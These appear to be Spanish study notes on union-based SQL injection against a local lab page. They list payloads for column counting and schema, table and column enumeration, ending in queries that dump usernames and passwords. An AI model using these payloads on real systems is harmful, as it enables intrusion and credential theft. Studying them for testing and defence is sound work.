--------------
Tag: #errorsqli

-------------
Comentando una query mysql para ver si se producen errores:
```url
http://localhost/searchUsers.php?id=1'-- -
http://localhost/searchUsers.php?id=1'#
```

Podemos realizar un ordenamiento, pero lo primero que tenemos que saber es cuantas columnas:

```url
?id=3' order by 100-- -
# Por fuzzing vemos cuantas columnas tiene
?id=1' order by 1-- -
```

Con **union**, para cada columna le pones el valor que tu quieras ver. Siempre tiene que haber el mismo número de datos que se ponen con el union que columnas haya. En este caso como solo hay 1 columna solo podremos poner un dato. Con todo esto, si ponemos un usuario que no existe en la base de datos y nos sale el valor que hemos pues con la sentencia union, ya podríamos empezar con la sqli
```url
?id=1' union select 1-- -
localhost/searchUsers.php?id=hola' union select hola-- -
```

Listamos la base de datos que se está usando:
```url
localhost/searchUsers.php?id=hola' union select database()-- -
localhost/searchUsers.php?id=hola' union select schema_name from information_schema.schemata limit 0,1-- -
localhost/searchUsers.php?id=hola' union select group_concat(schema_name) from information_schema.schemata-- -
```
El uso de *group_concat* es para que en caso de que haya más de una tabla, nos liste todas en el output.
(Puede que las sentencias no te muestre todas las bases de datos que existen en el sistema, para ello se puede utilizar las dos últimas sentencias)

Una vez sabemos las bases de datos, pasamos a listar las tablas.
```url
localhost/searchUsers.php?id=hola' union select group_concat(table_name) from information_schema.tables where table_schema='hack4u'-- -
```

Listamos las columnas de las tabla users:
```url
localhost/searchUsers.php?id=hola' union select group_concat(column_name) from information_schema.columns where table_schema='hack4u' and table_name='users'-- -
```

Listamos las filas de la tabla después de saber las columnas:
```url
localhost/searchUsers.php?id=hola' union select group_concat(column_name) from information_schema.columns where table_schema='hack4u' and table_name='users'-- -
localhost/searchUsers.php?id=hola' union select group_concat(username) from hack4u.users-- -
localhost/searchUsers.php?id=hola' union select group_concat(username,':',password) from hack4u.users-- -
localhost/searchUsers.php?id=hola' union select group_concat(username,0x3a,password) from hack4u.users-- -
```
